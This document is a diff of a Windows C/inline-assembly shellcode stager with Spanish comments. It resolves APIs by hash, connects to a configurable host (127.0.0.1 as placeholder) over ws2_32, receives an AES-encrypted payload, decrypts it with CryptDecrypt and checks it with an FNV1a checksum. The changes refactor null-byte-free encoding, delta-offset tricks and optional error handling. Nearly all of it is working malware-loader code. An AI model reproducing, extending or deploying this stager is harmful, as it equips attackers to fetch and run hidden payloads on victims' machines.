@@ -9,21 +9,7 @@
 #include <Windows.h>
 #include "macros.h"
 
-void LoadFunctions(DWORD BaseAddress,DWORD lpHashes,DWORD numHashes);
-void gtfo(DWORD exit_code);
-
-/*###############################################################################
-** Control de errores:
-**    Constantes utilizadas en el control de errores.
-**    Solamente las excepciones críticas serán controladas, y
-**    se devolverá la constante de error correspondiente como
-**    'Exit Code' en ExitProcess()@kernel32
-*###############################################################################*/
-#define ERR_NO  0x0     //No ha habido ningun error. El server ha finalizado correctamente.
-#define ERR_FNC 0x1     //Ha habido un error en la funcion LoadFunctions(). Probablemente alguna función no se ha encontrado.
-#define ERR_HST 0x2     //Ha habido un error al resolver el Hostname. Probablemente debido a un problema de conexión.
-#define ERR_MEM 0x3     //Ha habido un error al reservar memoria.
-#define ERR_SUM 0x4     //Ha habido un error en la suma de comprobación.
+void LoadFunctions(DWORD lpHashes, DWORD numHashes);
 
 /*###############################################################################
 ** Identificadores para APIs y variables:
@@ -53,7 +39,7 @@ void __declspec(naked) main(){
         **    }
         *###############################################################################*/
 
-IP:     EMIT_BYTE_ARRAY(('1') ('2') ('7') ('.') ('0') ('.') ('0') ('.') ('1')(0))
+HOST:   EMIT_BYTE_ARRAY(('1') ('2') ('7') ('.') ('0') ('.') ('0') ('.') ('1')(0))
 KEY:   	//typedef struct aes128Blob{
             //BLOBHEADER{
                 /*bType*/       EMIT_BYTE(PLAINTEXTKEYBLOB)
@@ -92,19 +78,22 @@ advapi32_symbol_hashes:
         /*CryptDecrypt*/        HASH_AND_EMIT( ('C') ('r') ('y') ('p') ('t') ('D') ('e') ('c') ('r') ('y') ('p') ('t') )
 #pragma endregion
 
+#ifdef ERR_CHECK
+/*###############################################################################
+** gtfo:
+**    Método para salir en cualquier momento de la ejecución sin mostrar ningún
+**    error crítico, además es usado para tener una mejor idea de lo ocurrido
+*###############################################################################*/
+
+gtfo:
+        test eax, eax
+        jne  conti
+        call [ebp+_ExitProcess]
+conti:
+        ret 0x4
+#endif
 start:
-        /*###############################################################################
-        ** Creación del stack de direcciones:
-        **    Lo primero que hacemos es reservar espacio en el stack para almacenar
-        **    las direcciones de APIs, también las variables.
-        **    Utilizaremos durante todo el código EBP como puntero al inicio de este
-        **    'stack de direcciones'
-        *###############################################################################*/
-
-        sub  esp, STACKSIZE
-        mov  ebp, esp
-
-#ifdef SHELLCODE
+#ifdef SC_DELTA
         /*###############################################################################
         ** Obtención del Delta offset:
         **    Obtenemos la posición relativa de nuestro código.
@@ -128,9 +117,23 @@ find_delta:
             (0xD9) (0x74) (0x24) (0xF4)    //fstenv (28-BYTE) PTR SS:[esp-0x0C]
         )
         pop  edi
+        #ifdef SC_NULL
         add  edi, K
         sub  edi, (find_delta+K)
+        #else
+        sub  edi, find_delta
+        #endif
 #endif
+        /*###############################################################################
+        ** Creación del stack de direcciones:
+        **    Lo primero que hacemos es reservar espacio en el stack para almacenar
+        **    las direcciones de APIs, también las variables.
+        **    Utilizaremos durante todo el código EBP como puntero al inicio de este
+        **    'stack de direcciones'
+        *###############################################################################*/
+
+        sub  esp, STACKSIZE
+        mov  ebp, esp
 
         /*###############################################################################
         ** Carga de APIs:
@@ -153,30 +156,32 @@ next_module:
         jmp  next_module
 find_kernel32_finished:
 
-        movr(edi, LoadFunctions)
+        movr(esi, LoadFunctions)
+
         //Cargamos las apis de kernel32 en la pila a partir de los hashes
         push kernel32_count             //v Número de hashes de kernel32
         pushr(kernel32_symbol_hashes)   //v Puntero al primer hash de kernel32
-        push eax                        //v kernel32 BaseAddress
-        call edi                        //>LoadFunctions(&kernel32, &kernel32_symbol_hashes, kernel32_count);
+        //EAX = kernel32 BaseAddress
+        call esi                        //>LoadFunctions([&kernel32,] &kernel32_symbol_hashes, kernel32_count);
 
         mov  ebx, [ebp+_LoadLibraryA-(kernel32_count*4)]//EBX = &LoadLibraryA
+
         //Obtenemos la BaseAddress de ws2_32
         pushc('23')                     //v
         pushc('_2sw')                   //v Metemos el nombre del API en el stack (ANSI)
         push esp                        //v
         call ebx                        //>LoadLibraryA("ws2_32");
+
         //Cargamos las APIs de ws2_32 en la pila a partir de los hashes
         add  esp, 0x8                   //Restauramos la pila sacando la cadena ANSI
-
         push ws2_32_count               //v Número de hashes de ws2_32
         pushr(ws2_32_symbol_hashes)     //v Puntero al primer hash de ws2_32.dll
-        push eax                        //v ws_32 BaseAddress
-        call edi                        //>LoadFunctions(&ws2_32, &ws2_32_symbol_hashes, ws2_32_count);
+        //eax = ws_32 BaseAddress
+        call esi                        //>LoadFunctions([&ws2_32,] &ws2_32_symbol_hashes, ws2_32_count);
 
         //Obtenemos el BaseAddress de advapi32
-        xor  eax, eax                   //EAX = 0
-        push eax                        //v
+        cdq                             //EDX = 0
+        push edx                        //v
         pushc('23ip')                   //v Metemos el nombre del API en el stack (ANSI)
         pushc('avda')                   //v
         push esp                        //v
@@ -185,12 +190,11 @@ find_kernel32_finished:
 
         push advapi32_count             //v Número de hashes de advapi32
         pushr(advapi32_symbol_hashes)   //v Puntero al primer hash de advapi32
-        push eax                        //v advapi32 BaseAddress
-        call edi                        //>LoadFunctions(&advapi32, &advapi32_symbol_hashes, advapi32_count);
+        //eax = advapi32 BaseAddress
+        call esi                        //>LoadFunctions([&advapi32,] &advapi32_symbol_hashes, advapi32_count);
 
         //Volvemos a apuntar el stack de APIs al inicio
         sub  ebp, (kernel32_count + ws2_32_count + advapi32_count)*4
-
 
 
         //Creamos el buffer donde recibiremos toda la información
@@ -198,10 +202,10 @@ find_kernel32_finished:
         pushc(BUFF_SIZE)                //v
         push GPTR                       //v
         call [ebp+_GlobalAlloc]         //>GlobalAlloc(GPTR, BUFF_SIZE)
-
+        #ifdef ERR_CHECK
         push ERR_MEM                    //v
-        callr(gtfo)                     //>(EAX!=0)? No ha habido error, tenemos donde guardar los datos
-
+        call gtfo                       //>(EAX!=0)? No ha habido error, tenemos donde guardar los datos
+        #endif
         mov  [ebp+_pBuff], eax          //pBuffer = EAX
 
         /*###############################################################################
@@ -236,12 +240,13 @@ newSocket:
         mov  [ebp+_hSocket], eax        //hSocket = EAX
 
         //Obtenemos la dirección válida
-        pushr(IP)                       //v
-        call [ebp+_gethostbyname]       //>gethostbyname(&IP);
+        pushr(HOST)                     //v
+        call [ebp+_gethostbyname]       //>gethostbyname(&HOST);
 
+        #ifdef ERR_CHECK
         push ERR_HST                    //v
-        callr(gtfo)                     //>EAX!=0? (Si fallamos al obtener el host mejor salimos...)
-
+        call gtfo                       //>EAX!=0? (Si fallamos al obtener el host mejor salimos...)
+        #endif
         add  eax, 0x20                  //EAX = hostent.h_name
         push eax                        //v
         call [ebp+_inet_addr]           //>inet_addr(hostent.h_name);
@@ -320,6 +325,7 @@ init_decrypt:
         add  [esp], _hProv              //v
         call [ebp+_CryptAcquireContextA]//>CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
 		//Importamos la clave
+        cdq                             //EDX = 0
 		push ebp                        //v
 		add  [esp], _hKey               //v Direccion a la variable que contendra el Handler a la key
 		push edx						//v
@@ -342,7 +348,7 @@ init_decrypt:
 
 		//Finalmente desciframos los datos obtenidos
 		//Los datos se encuentran en el paquete asi: IV(16Bytes)+DataEncrypt
-        //cdq						
+        //cdq
 
 		push [ebp+_buffLen]             //Variable temporal para guardar el tamaño de los datos a leer
 
@@ -381,8 +387,6 @@ FNV1a:
         jz   NoErr4                     //>(EDX==0?)Si es igual a cero significa que los datos recibidos eran correctos
 
         //Algo falla en el checksum... reseteemos la conexión
-        //push ERR_SUM                  //v
-        //callr(gtfo)                   //>gtfo(ERR_SUM);
         jmp  KillSocket
 
 NoErr4: //pushr(HASH)                   //v
@@ -400,17 +404,16 @@ NoErr4: //pushr(HASH)                   //v
 **  Método encargado de rellenar el stack de direcciones.
 **  Llama a la función FindFunction() por cada hash en la lista
 **  almacenando la dirección en su respectiva posicion del stack.
-**  NOTA{
-**      Modifica los registros EAX, ESI, ECX, EBX, EBP
-**  }
+**  RECIBE BASEADDRESS EN EAX y el puntero  a HASHES en ESI
 *###############################################################################*/
-void __declspec(naked) LoadFunctions(DWORD BaseAddress, DWORD lpHashes, DWORD numHashes){
+void __declspec(naked) LoadFunctions(DWORD lpHashes, DWORD numHashes){
     __asm{
-        pop  eax                        //EAX = &ret
-        pop  edx                        //EDX = &IMAGE_DOS_HEADER
-        pop  esi                        //ESI = lpHashes
-        pop  ecx                        //ECX = numHashes
-        push eax                        //Restauramos el retorno
+        pushad
+        lea  esi, [esp+0x24]            //ESI = &&lpHashes
+        mov  ecx, [esi+0x4]             //ECX = numHashes
+        mov  esi, [esi]                 //ESI = &lpHashes
+        mov  edx, eax                   //EDX = &IMAGE_DOS_HEADER
+        lea  edi, [ebp+4]
 
 nextFunction:
         lodsw                           //mov ax, WORD[esi]; esi+=2
@@ -429,15 +432,16 @@ find_function:
         add  edi, edx                   //EDI = EAT (RVA)
         mov  ecx, [edi+0x18]            //ECX = IMAGE_EXPORT_DIRECTORY.NumberOfFunctions
         mov  ebp, [edi+0x20]            //EBP = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions (RVA)
-        add  ebp, edx                   //EBP = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions (VA)
-        #ifdef SHELLCODE
-        inc  ebp                        //EBP++;
+        #ifdef SC_NULL
+        inc  edx                        //EDX++;
         #endif
+        add  ebp, edx                   //EBP = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions (VA)
 find_function_loop:
         jecxz find_function_finished    //Si ECX == 0 ya no quedan funciones por recorrer
         dec  ecx                        //ECX--
-        #ifdef SHELLCODE
-        mov  esi, [ebp+ecx*4+1]         //ESI = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions[X] (RVA)
+        #ifdef SC_NULL
+        mov  esi, [ebp+ecx*4-1]         //ESI = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions[X] (RVA)
+        dec  esi
         #else
         mov  esi, [ebp+ecx*4]
         #endif
@@ -458,54 +462,35 @@ compute_hash_finished:
 find_function_compare:
         pop  eax
         cmp  bx, ax                     //v
-        jnz  find_function_loop         //>(DX == FunctionHash)?
+        jnz  find_function_loop         //>(BX == FunctionHash)?
         mov  ebp, [edi+0x24]            //EBP = IMAGE_EXPORT_DIRECTORY.AddressOfNames (RVA)
         add  ebp, edx                   //EBP = IMAGE_EXPORT_DIRECTORY.AddressOfNames (VA)
-        #ifdef SHELLCODE
-        mov  cx, [ebp+ecx*2+1]
+        #ifdef SC_NULL
+        mov  cx, [ebp+ecx*2-1]
         #else
         mov  cx, [ebp+ecx*2]
         #endif
         mov  ebp, [edi+0x1C]
         add  ebp, edx
-        #ifdef SHELLCODE
-        mov  eax, [ebp+4*ecx+1]
+        #ifdef SC_NULL
+        mov  eax, [ebp+4*ecx-1]
+        dec  eax
         #else
         mov  eax, [ebp+4*ecx]
         #endif
+
         add  eax, edx
 find_function_finished:
         mov  [esp+0x1C], eax
         popad
 #pragma endregion EAX=HASH;EBX=BaseAddr
 
-        /*test eax, eax                   //v
-        jnz  NoErr1                     //>(EAX!=0)?Si se ha encontrado la dirección no hay error
-
-        push ERR_FNC                    //v
-        callr(gtfo)                     //>gtfo(ERR_FNC);
-        */
-
-NoErr1: mov  [ebp+4], eax               //Guardamos dir en buffer pila
-        add  ebp, 4                     //EDX++
+        //Guardamos dir en buffer pila
+        stosd                           //mov [edi], eax; edi+=4
         loop nextFunction               //(ECX--);(ECX!=0)?
-        
+        sub  edi, 4
+        mov  [esp+0x8], edi
+        popad
         ret
-    }
-}
-
-/*###############################################################################
-** gtfo:
-**    Método para salir en cualquier momento de la ejecución sin mostrar ningún
-**    error crítico, además es usado para tener una mejor idea de lo ocurrido
-*###############################################################################*/
-
-void __declspec(naked) gtfo(DWORD exit_code){
-    __asm{
-        test eax, eax
-        jne  conti
-        call [ebp+_ExitProcess]
-conti:
-        ret 0x4
     }
 }
